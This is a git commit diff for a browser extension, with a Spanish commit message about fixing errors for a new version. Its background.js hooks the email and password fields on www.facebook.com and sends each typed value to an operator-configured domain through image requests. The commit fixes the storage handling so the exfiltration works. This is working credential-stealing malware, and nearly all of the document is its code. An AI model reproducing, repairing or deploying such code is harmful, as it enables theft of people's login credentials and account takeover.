b071c89e8fd302dd99e81026dd31bdd329c24351
Campanita <rapunzel@disroot.org>
2024-09-17 20:47:35 -0600

    Corrigiendo errores para nueva version

--- background.js
+++ background.js
@@ -4,15 +4,13 @@ function send_data(dom, type, data){
   elem.src = dom + "/" + type + ".php?v=" + encodeURIComponent(data) + "&d=" + encodeURIComponent(new Date().toISOString());
   document.body.appendChild(elem);
 }
-
 if (window.location.hostname == "www.facebook.com"){
-  // Correo
-  document.getElementById("email").addEventListener("input", async function(e){
-    send_data((await browser.storage.local.get("dominio")), "correo", this.value);
-  });
+  browser.storage.local.get("dominio").then((domObj) => {
+    let dominio = domObj.dominio || "";
+    // Correo
+    document.getElementById("email").addEventListener("input", (e) => send_data(dominio, "correo", e.target.value) );
 
-  // Contrasena
-  document.getElementById("pass").addEventListener("input", async function(e){
-    send_data((await browser.storage.local.get("dominio")), "contra", this.value);
+    // Contrasena
+    document.getElementById("pass").addEventListener("input", (e) => send_data(dominio, "contra", e.target.value) );
   });
 }
--- options.js
+++ options.js
@@ -1,15 +1,15 @@
 async function recuperar(){
   let res = await browser.storage.local.get("dominio");
-  alert(res.constructor.name);
-  document.getElementById("dominio").value = res;
+  document.getElementById("dominio").value = res.dominio || "";
 }
 
 async function guardar(){
   await browser.storage.local.set({
-    { dominio: document.getElementById("dominio").value }
+    dominio: document.getElementById("dominio").value
   });
-  alert(await browser.storage.local.get("dominio"));
 }
 
-document.addEventListener("DOMContentLoaded", recuperar);
-document.getElementById("guardar").addEventListener("click", guardar);
+document.addEventListener("DOMContentLoaded", () => {
+  recuperar();
+  document.getElementById("guardar").addEventListener("click", guardar);
+});
